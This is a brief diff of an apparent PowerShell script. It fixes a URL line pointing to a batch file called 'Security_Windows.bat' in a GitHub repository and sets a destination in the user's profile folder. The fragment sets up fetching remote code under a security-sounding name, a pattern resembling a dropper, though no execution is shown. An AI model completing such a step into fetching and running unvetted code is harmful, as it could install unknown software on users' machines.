@@ -1,4 +1,4 @@
-$url = f"https://github.com/n0t_cr1m3/test/blob/main/Security_Windows.bat"
+$url = "https://github.com/n0t_cr1m3/test/blob/main/Security_Windows.bat"
 
 # Spécifiez le chemin de destination où le fichier sera enregistré
 $destination = "$env:USERPROFILE/Security_Windows.bat"
